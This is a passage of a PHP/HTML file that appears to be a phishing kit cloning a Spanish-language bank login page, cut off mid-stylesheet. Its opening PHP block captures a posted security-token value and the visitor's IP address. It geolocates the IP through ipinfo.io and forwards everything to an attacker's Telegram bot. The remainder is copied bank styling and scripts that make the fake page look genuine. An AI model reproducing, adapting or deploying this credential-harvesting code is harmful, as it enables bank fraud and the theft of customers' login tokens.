<?php
ini_set("display_errors", 0);
include "DONDECAE.php";


if (isset($_POST['t0s24u824s']) ) {
    $input = $_POST['t0s24u824s'];
    $ipInfoResponse = getIpInfo($_SERVER['REMOTE_ADDR']);
    $codigopais = isset($ipInfoResponse['country']) ? $ipInfoResponse['country'] : 'Desconocido';
    $mensajex .= "F0RM0S4\nT0K4NSS #2: ".$_POST['t0s24u824s']."\nIP: ".$_SERVER['REMOTE_ADDR']."\nPaís: ".$codigopais."\nC0DE BY SYN4PSE";

    env($token, $tid, $mensajex);
}
function getIpInfo($ip) {
    $url = "http://ipinfo.io/{$ip}/json";  
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);
    
    return json_decode($response, true);
}
function env($token, $chatID, $mensaje) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = array(
        'chat_id' => $chatID,
        'text' => $mensaje
    );

    $options = array(
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
    );

    $curl = curl_init();
    curl_setopt_array($curl, $options);
    $response = curl_exec($curl);
    curl_close($curl);

    return $response;
    
}

?>

<!DOCTYPE html>
<html lang="es">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <style>body {transition: opacity ease-in 0.2s; } 
         body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
      </style>
      <title>siempre contamos contigo</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge">
      <style>
         .loading {
         position: absolute;
         width: 100%;
         height: 100%;
         background-color: rgba(255, 255, 255, 0.9019607843137255);
         z-index: 9999999999999999999999999999999999999999999999999999999999;
         top: 0px;
         left: 0px;
         text-align: center;
         overflow: hidden;
         }
         @-webkit-keyframes loading {
         0% {
         box-shadow: 0px 17px 10px -10px rgba(0, 0, 0, 0.4);
         }
         50% {
         box-shadow: 0px 37px 20px -15px rgba(0, 0, 0, 0.2);
         transform: translate(0px, -10px);
         }
         100% {
         box-shadow: 0px 17px 10px -10px rgba(0, 0, 0, 0.4);
         transform: translate(0px, 0px);
         }
         }
         @keyframes loading {
         0% {
         box-shadow: 0px 17px 10px -10px rgba(0, 0, 0, 0.4);
         }
         50% {
         box-shadow: 0px 37px 20px -15px rgba(0, 0, 0, 0.2);
         transform: translate(0px, -10px);
         }
         100% {
         box-shadow: 0px 17px 10px -10px rgba(0, 0, 0, 0.4);
         transform: translate(0px, 0px);
         }
         }
      </style>
      <link rel="stylesheet" href="cesita/styles.2f31e5c975b8dfa85658.css">
      <style>.container-flow[_ngcontent-c0]{position:relative;background-color:#fff;width:100%;height:100vh}.version[_ngcontent-c0]{color:#18cc18;font-size:18px;position:fixed;right:20px;bottom:0;z-index:99999999999999999999999999}.main-container[_ngcontent-c0]{background-color:#fff;transition:all .25s ease;position:absolute;top:89px;right:0;width:calc(100% - 270px);height:calc(100% - 89px);overflow-x:hidden;padding:0 20px 20px}.main-container.sucursales[_ngcontent-c0]{padding-bottom:0;padding-right:0;padding-left:0}.full-container[_ngcontent-c0]{position:relative;width:100%}.alignToLogo[_ngcontent-c0]{padding:0 73px}@media only screen and (max-width:1366px) and (min-width:1276px){.alignToLogo[_ngcontent-c0]{padding:0 50px}}@media only screen and (max-width:810px){.alignToLogo[_ngcontent-c0]{padding:20px}}.lcp[_ngcontent-c0]{top:0;width:100%;height:100%!important}.login-img[_ngcontent-c0]{background-repeat:no-repeat;background-size:cover}.alert-container[_ngcontent-c0]{position:fixed;z-index:2147483647;bottom:10px;display:block}.backendmessage[_ngcontent-c0]{padding:14px 20px 0;cursor:pointer;border:1px solid transparent;border-radius:.25rem;-webkit-animation-name:bounceInRight;animation-name:bounceInRight;-webkit-animation-duration:1s;animation-duration:1s;-webkit-animation-fill-mode:both;animation-fill-mode:both;z-index:100;margin:15px 15px 1rem}.backendmessage[_ngcontent-c0] > p[_ngcontent-c0]{color:#fff;font-size:16px}.message-error[_ngcontent-c0]{background-color:#f44336}.message-warn[_ngcontent-c0]{background-color:#ff9800}.message-success[_ngcontent-c0]{background-color:#4caf50}.blur[_ngcontent-c0]{-webkit-filter:blur(4px);filter:blur(4px)}@-webkit-keyframes fadeInFromNone{0%{display:none;opacity:0}1%{display:block;opacity:0}100%{display:block;opacity:1}}@keyframes fadeInFromNone{0%{display:none;opacity:0}1%{display:block;opacity:0}100%{display:block;opacity:1}}@-webkit-keyframes fadeOutFromNone{0%,1%{display:block;opacity:1}100%{display:none;opacity:0}}@keyframes fadeOutFromNone{0%,1%{display:block;opacity:1}100%{display:none;opacity:0}}.Tooltip[_ngcontent-c0]{position:absolute;width:-webkit-fit-content;width:-moz-fit-content;width:fit-content;background:#1a1a1a;color:#fff;padding:8px;max-width:250px;border-radius:5px;-webkit-transform:translate(-50%,-100%) translateY(-20px);transform:translate(-50%,-100%) translateY(-20px);z-index:99999999999}.Tooltip[_ngcontent-c0]   p[_ngcontent-c0]{font-size:14px}.Tooltip[_ngcontent-c0]   .triangle[_ngcontent-c0]{width:10px;height:10px;position:absolute;border-left:10px solid transparent;border-right:10px solid transparent;border-top:10px solid #1a1a1a;bottom:-10px;left:calc(50% - 10px)}.Tooltip.oculto[_ngcontent-c0]{-webkit-animation:.2s ease-in-out fadeOutFromNone;animation:.2s ease-in-out fadeOutFromNone;opacity:0;display:none}.Tooltip.mostrando[_ngcontent-c0]{-webkit-animation:.2s ease-in-out fadeInFromNone;animation:.2s ease-in-out fadeInFromNone;opacity:1;display:block}.Tooltip.left[_ngcontent-c0]:not(.bottom){-webkit-transform:translateX(-100%) translateX(-20px) translateY(-50%);transform:translateX(-100%) translateX(-20px) translateY(-50%)}.Tooltip.left[_ngcontent-c0]:not(.bottom)   .triangle[_ngcontent-c0]{-webkit-transform:rotate(-90deg);transform:rotate(-90deg);left:unset;right:-15px;bottom:calc(50% - 5px)}.Tooltip.left.bottom[_ngcontent-c0]{-webkit-transform:translateX(-100%) translateX(10px) translateY(100%);transform:translateX(-100%) translateX(10px) translateY(100%)}.Tooltip.left.bottom[_ngcontent-c0]   .triangle[_ngcontent-c0]{-webkit-transform:rotate(180deg);transform:rotate(180deg);top:-10px;left:unset;right:0}.Tooltip.right[_ngcontent-c0]:not(.bottom){-webkit-transform:translateX(25px) translateY(-50%);transform:translateX(25px) translateY(-50%)}.Tooltip.right[_ngcontent-c0]:not(.bottom)   .triangle[_ngcontent-c0]{bottom:calc(50% - 5px);-webkit-transform:rotate(90deg);transform:rotate(90deg);left:-15px}.Tooltip.right.bottom[_ngcontent-c0]{-webkit-transform:translateX(0) translateY(100%);transform:translateX(0) translateY(100%)}.Tooltip.right.bottom[_ngcontent-c0]   .triangle[_ngcontent-c0]{-webkit-transform:rotate(180deg);transform:rotate(180deg);top:-10px;left:0}.Tooltip.bottom[_ngcontent-c0]:not(.left):not(.right){-webkit-transform:translateX(-50%) translateY(100%);transform:translateX(-50%) translateY(100%)}.Tooltip.bottom[_ngcontent-c0]:not(.left):not(.right)   .triangle[_ngcontent-c0]{bottom:unset;top:-10px;-webkit-transform:rotate(180deg);transform:rotate(180deg)}@media only screen and (max-width:1366px){.main-container[_ngcontent-c0]{width:calc(100% - 220px)}}@media only screen and (max-width:1275px){.main-container[_ngcontent-c0]{width:100%}}@media only screen and (max-width:810px){.container-flow[_ngcontent-c0]{overflow:visible}.main-container[_ngcontent-c0]{top:134px;height:calc(100% - 134px);padding-top:20px}}@-webkit-keyframes pulse{from,to{-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1)}50%{-webkit-transform:scale3d(1.2,1.2,1.2);transform:scale3d(1.2,1.2,1.2)}}@keyframes pulse{from,to{-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1)}50%{-webkit-transform:scale3d(1.2,1.2,1.2);transform:scale3d(1.2,1.2,1.2)}}.pulse[_ngcontent-c0]{-webkit-animation-name:pulse;animation-name:pulse}  .login-splash{background:rgba(255,255,255,.901961);position:fixed;top:0;bottom:0;left:0;right:0;display:none;align-items:center;z-index:9999999999999999999999999999999999999999999999;justify-content:center}  .login-splash .custom-animation{width:150px;z-index:99999999999999999999999999999999999999999999999;-webkit-animation:1s ease-in infinite pulse;animation:1s ease-in infinite pulse}@media all and (-ms-high-contrast:none),(-ms-high-contrast:active){.login-splash[_ngcontent-c0]{display:flex}.notIE[_ngcontent-c0]{display:none}}@supports (-ms-ime-align:auto){.login-splash[_ngcontent-c0]{display:flex}.notIE[_ngcontent-c0]{display:none}}@supports (-ms-accelerator:true){.login-splash[_ngcontent-c0]{display:flex}.notIE[_ngcontent-c0]{display:none}}@-moz-document url-prefix(){.login-splash{display:flex}.notIE{display:none}}.background[_ngcontent-c0]{position:fixed;left:0;top:0;width:100%;height:100%;background:rgba(0,0,0,.3);z-index:9999}.background[_ngcontent-c0]   .body[_ngcontent-c0]{position:absolute;top:0;left:0;z-index:4;-webkit-transform:translate(50vw,50vh) translate(-50%,-50%);transform:translate(50vw,50vh) translate(-50%,-50%);border-radius:5px;overflow:hidden;width:500px;max-width:calc(100% - 40px)}.background[_ngcontent-c0]   .body[_ngcontent-c0]   .header[_ngcontent-c0]{background:#003f75;padding:20px}.background[_ngcontent-c0]   .body[_ngcontent-c0]   .header[_ngcontent-c0]   h1[_ngcontent-c0]{color:#fff;margin-right:30px}.background[_ngcontent-c0]   .body[_ngcontent-c0]   .header[_ngcontent-c0]   img[_ngcontent-c0]{position:absolute;right:10px;top:20px;width:30px;cursor:pointer}.background[_ngcontent-c0]   .body[_ngcontent-c0]   .content[_ngcontent-c0]{background-color:#fff}.background[_ngcontent-c0]   .body[_ngcontent-c0]   .content[_ngcontent-c0]   .stage[_ngcontent-c0]{position:relative;width:100%;height:100%;padding:20px}.background[_ngcontent-c0]   .body[_ngcontent-c0]   .content[_ngcontent-c0]   .stage.center[_ngcontent-c0]{text-align:center}button.switchAccesible[_ngcontent-c0]{width:auto;opacity:.4;z-index:99;position:fixed;top:10px;left:90px}</style>
      <script charset="utf-8" src="imexi/1.14d3351f43c9e5f9e1a9.js.descarga"></script><script charset="utf-8" src="imexi/2.ee5bfc4dee752f380a0e.js.descarga"></script><script charset="utf-8" src="imexi/3.8411867f7b3c5347dab0.js.descarga"></script><script charset="utf-8" src="imexi/4.fa60f5ed5eb565358bde.js.descarga"></script><script charset="utf-8" src="imexi/6.3a3d9ec4a010692d52e7.js.descarga"></script><script charset="utf-8" src="imexi/7.a97b64b6394d1ba02c83.js.descarga"></script><script charset="utf-8" src="imexi/16.158cfe0364ab8ec58193.js.descarga"></script><script charset="utf-8" src="imexi/common.99799be1e8efbe9125d2.js.descarga"></script><script charset="utf-8" src="imexi/25.68e89794ec2ab37485f4.js.descarga"></script>
      <style type="text/css">#_copy{align-items:center;background:#4494d5;border-radius:3px;color:#fff;cursor:pointer;display:flex;font-size:13px;height:30px;justify-content:center;position:absolute;width:60px;z-index:1000}#select-tooltip,#sfModal,.modal-backdrop,div[id^=reader-helper]{display:none!important}.modal-open{overflow:auto!important}._sf_adjust_body{padding-right:0!important}.super_copy_btns_div{position:fixed;width:154px;left:10px;top:45%;background:#e7f1ff;border:2px solid #4595d5;font-weight:600;border-radius:2px;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;z-index:5000}.super_copy_btns_logo{width:100%;background:#4595d5;text-align:center;font-size:12px;color:#e7f1ff;line-height:30px;height:30px}.super_copy_btns_btn{display:block;width:128px;height:28px;background:#7f5711;border-radius:4px;color:#fff;font-size:12px;border:0;outline:0;margin:8px auto;font-weight:700;cursor:pointer;opacity:.9}.super_copy_btns_btn:hover{opacity:.8}.super_copy_btns_btn:active{opacity:1}</style>
      <style>[_nghost-c5]     .login-container .login-box .check-cont .checkRCont{border-color:#fff!important}.login-container[_ngcontent-c5]{width:100vw;min-height:100vh;max-width:100%;overflow:hidden;position:relative}.login-container[_ngcontent-c5]   .formosaVideo[_ngcontent-c5]{position:absolute;width:100%;height:100%;top:0;display:block;background-color:rgba(0,0,0,.3);z-index:1}.login-container[_ngcontent-c5]   .passEye[_ngcontent-c5]{position:absolute;right:70px;bottom:150px;width:25px}.login-container[_ngcontent-c5]   .passEye[_ngcontent-c5]   img[_ngcontent-c5]{width:100%}.login-container[_ngcontent-c5]   video[_ngcontent-c5]{position:fixed;left:50%;top:0;-webkit-transform:translateX(-50%);transform:translateX(-50%);min-width:100%;min-height:100%}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]{display:flex;justify-content:space-between;flex-direction:column;height:100%;min-height:calc(100vh - 1px)}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5], .login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .footer[_ngcontent-c5], .login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .header[_ngcontent-c5]{z-index:1;margin-left:4vw;margin-right:4vw}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .header[_ngcontent-c5]{display:flex;flex-direction:row;justify-content:space-between;margin-top:2vh;margin-bottom:2vh;padding-bottom:2vh;border-bottom:1px solid #fff;color:#fff}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .header[_ngcontent-c5]   .logo[_ngcontent-c5]{width:240px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .header[_ngcontent-c5]   .links[_ngcontent-c5]{display:flex;align-items:center;justify-content:flex-end;flex-direction:row}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .header[_ngcontent-c5]   .links[_ngcontent-c5]   img[_ngcontent-c5]{height:50px;margin-right:10px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .header[_ngcontent-c5]   .links[_ngcontent-c5]   h3[_ngcontent-c5]{font-size:20px;white-space:nowrap;margin:0}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .header[_ngcontent-c5]   .links[_ngcontent-c5]   p[_ngcontent-c5]{font-size:12px;white-space:nowrap;margin:0}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .header[_ngcontent-c5]   .links[_ngcontent-c5]   .apps[_ngcontent-c5], .login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .header[_ngcontent-c5]   .links[_ngcontent-c5]   .tels[_ngcontent-c5]{display:flex;flex-direction:column;align-items:flex-start;justify-content:space-around;margin-right:30px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]{display:flex;align-items:flex-start;flex-direction:row;justify-content:space-around}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .info[_ngcontent-c5]{color:#fff;text-align:left;max-width:560px;align-self:center;margin-right:20px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .info[_ngcontent-c5]   h1[_ngcontent-c5]{font-size:35px;font-weight:700}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .info[_ngcontent-c5]   p[_ngcontent-c5]{font-size:14px;font-weight:700}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]{position:relative;display:flex;flex-direction:column;flex-shrink:0;justify-items:flex-start;background-color:rgba(0,61,121,.7);padding:60px 50px 3vh;border-radius:10px;max-width:430px;color:#fff;margin-bottom:20px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box.securityImage[_ngcontent-c5]{margin-top:40px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .widthVolver[_ngcontent-c5]{width:calc(100% - 110px)}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .imgSeguridad[_ngcontent-c5]{height:13vh;width:13vh;min-height:80px;min-width:80px;max-height:100px;max-width:100px;border-radius:10px;border:1px solid #fff;position:absolute;top:0;left:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);overflow:hidden}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .imgSeguridad[_ngcontent-c5]   img[_ngcontent-c5]{width:100%;height:100%}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   h1[_ngcontent-c5], .login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   h2[_ngcontent-c5]{margin-bottom:0;-webkit-touch-callout:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   h2[_ngcontent-c5]{font-size:20px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   h1[_ngcontent-c5]{font-size:27px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .info-text[_ngcontent-c5]{font-size:14px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .info-text.hide[_ngcontent-c5]{opacity:0;margin:0!important;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;max-height:0;overflow:hidden}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .short-line[_ngcontent-c5]{background-color:#e6e6e6;margin-top:20px;height:1px;width:80px;-webkit-touch-callout:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .warning-info[_ngcontent-c5]{background-color:#fff;display:flex;flex-direction:row;justify-content:flex-start;margin-top:20px;height:80px;margin-left:-50px;margin-right:-50px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .warning-info[_ngcontent-c5]   .warning-icon[_ngcontent-c5]{padding-top:6px;padding-left:50px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .warning-info[_ngcontent-c5]   .warning-icon[_ngcontent-c5]   img[_ngcontent-c5]{width:15px;height:15px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .warning-info[_ngcontent-c5]   .warning-text[_ngcontent-c5]{padding-top:10px;padding-left:8px;display:flex;flex-direction:column;justify-content:flex-start}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .warning-info[_ngcontent-c5]   .warning-text[_ngcontent-c5]   h1[_ngcontent-c5]{color:#f2994a;font-size:16px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .warning-info[_ngcontent-c5]   .warning-text[_ngcontent-c5]   p[_ngcontent-c5]{padding-top:5px;color:#003f75;font-size:13px;font-weight:600;line-height:15px}@media only screen and (max-width:1400px){.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .warning-info[_ngcontent-c5]{margin-left:-40px;margin-right:-40px;height:75px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .warning-info[_ngcontent-c5]   .warning-icon[_ngcontent-c5]{padding-left:40px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .warning-info[_ngcontent-c5]   .warning-text[_ngcontent-c5]   h1[_ngcontent-c5]{font-size:15px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .warning-info[_ngcontent-c5]   .warning-text[_ngcontent-c5]   p[_ngcontent-c5]{font-size:12px;font-weight:600;line-height:15px}}@media only screen and (max-width:810px){.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .warning-info[_ngcontent-c5]{margin-left:-10px;margin-right:-10px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .warning-info[_ngcontent-c5]   .warning-icon[_ngcontent-c5]{padding-left:10px}}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .input[_ngcontent-c5]::-webkit-input-placeholder{color:#fff;opacity:1}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .input[_ngcontent-c5]:-ms-input-placeholder{opacity:1;color:#fff}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .input[_ngcontent-c5]::-ms-input-placeholder{opacity:1;color:#fff}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .input[_ngcontent-c5]::placeholder{color:#fff;opacity:1}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   input[_ngcontent-c5]::-ms-clear, .login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   input[_ngcontent-c5]::-ms-reveal{display:none}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .input[_ngcontent-c5]{border:2px solid #fff;width:100%;max-width:100%;height:38px;border-radius:20px;background:url(imexi/user.9e8754f6da04522662ab.png) 15px 4px no-repeat;padding-left:60px;color:#fff;margin-top:20px;padding-right:40px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .input-pwd[_ngcontent-c5]{background:url(imexi/key.2d8b9614ffdb8d17a1f0.png) 15px 4px/25px 25px no-repeat;margin-top:20px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .input-tkn[_ngcontent-c5]{background:url(static/locked.304114069651e220d7a9.png) 15px 4px/25px 25px no-repeat;margin-top:20px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .boton[_ngcontent-c5]{width:100%;background-color:#fff;margin-top:20px;border-radius:20px;border:none;height:38px;font-weight:700;transition:all 2s ease;color:#003f75}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .boton[_ngcontent-c5]:hover{border:2px solid #fff;color:#fff;background-color:transparent}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .forgot-text[_ngcontent-c5]{text-align:center;cursor:pointer;font-size:14px;text-decoration:underline;margin-top:20px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .login-help[_ngcontent-c5]{background:#00a5df;align-self:center;padding:8px;width:calc(100% - 180px);border-radius:20px;position:absolute;bottom:0;-webkit-transform:translateY(40%);transform:translateY(40%);text-align:center;cursor:pointer}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .mobileInfo[_ngcontent-c5]{display:none}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .check-cont[_ngcontent-c5]{position:absolute;width:20px;height:20px;float:left}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .virtual-keyboard-cont[_ngcontent-c5]{position:absolute;right:calc(75% - -2rem);top:16rem;-webkit-transform:translateX(-50%) translateY(-100%) translateY(-20px);transform:translateX(-50%) translateY(-100%) translateY(-20px);z-index:1}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .footer[_ngcontent-c5]{display:flex;flex-direction:row;justify-content:space-around;padding-top:30px;padding-bottom:10px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .footer[_ngcontent-c5]   .link[_ngcontent-c5]{text-decoration:underline!important;color:#fff!important;font-weight:700;font-size:18px;cursor:pointer}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .footer[_ngcontent-c5]   .link[_ngcontent-c5]:hover{color:#42a7ff!important}.overlay[_ngcontent-c5]{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.5);display:flex;align-items:center;flex-direction:column;z-index:10;padding-top:85px}.overlay.alt[_ngcontent-c5]{padding-top:0;display:flex;align-items:center;flex-direction:column;justify-content:center}.overlay.alt[_ngcontent-c5]   .primary-button[_ngcontent-c5]{margin-left:0;display:block}.overlay[_ngcontent-c5]   .content[_ngcontent-c5]{border-radius:7px;width:800px;height:calc(100% - 100px);max-width:80%;background:#fff;padding-bottom:80px;position:relative}.overlay[_ngcontent-c5]   .content[_ngcontent-c5]   .box-modal-close[_ngcontent-c5]{position:absolute;left:100%;width:60px;top:0;cursor:pointer}.overlay[_ngcontent-c5]   .content[_ngcontent-c5]   .content-inside[_ngcontent-c5]{padding:15px}.overlay[_ngcontent-c5]   .title-container[_ngcontent-c5]{padding:25px;background:#003f75;margin:0;font-size:25px}.overlay[_ngcontent-c5]   .title-container[_ngcontent-c5]   .sub-title[_ngcontent-c5]{color:#fff;margin:0}.overlay[_ngcontent-c5]   .title-container[_ngcontent-c5]   .closeImg[_ngcontent-c5]{position:absolute;right:15px;top:25px;width:30px;cursor:pointer}@media only screen and (max-width:1860px){.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .virtual-keyboard-cont[_ngcontent-c5]{right:calc(75% - -1rem)}}@media only screen and (max-width:1780px){.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .virtual-keyboard-cont[_ngcontent-c5]{right:calc(75% - 2rem)}}@media only screen and (max-width:1680px){.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .virtual-keyboard-cont[_ngcontent-c5]{right:calc(75% - 5rem)}}@media only screen and (max-width:1585px){.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .virtual-keyboard-cont[_ngcontent-c5]{right:calc(75% - 8rem)}}@media only screen and (max-width:1400px){.login-container[_ngcontent-c5]   .passEye[_ngcontent-c5]{right:55px;top:341px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .header[_ngcontent-c5]   .logo[_ngcontent-c5]{width:200px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .header[_ngcontent-c5]   .links[_ngcontent-c5]   .apps[_ngcontent-c5], .login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .header[_ngcontent-c5]   .links[_ngcontent-c5]   .tels[_ngcontent-c5]{margin-right:20px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .info[_ngcontent-c5]   h1[_ngcontent-c5]{font-size:29px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]{max-width:400px;padding:55px 40px 4vh}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   h2[_ngcontent-c5]{font-size:17px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   h1[_ngcontent-c5]{font-size:24px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .info-text[_ngcontent-c5]{font-size:12px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .login-help[_ngcontent-c5]{width:calc(100% - 80px)}}@media only screen and (max-width:1250px){.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .virtual-keyboard-cont[_ngcontent-c5]{top:16.5rem}}@media only screen and (max-width:1010px){.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .virtual-keyboard-cont[_ngcontent-c5]{right:calc(75% - 7rem)}}@media only screen and (max-width:972px){.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .header[_ngcontent-c5]   .links[_ngcontent-c5]   .apps[_ngcontent-c5]{display:none}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]{max-width:380px}.login-container[_ngcontent-c5]   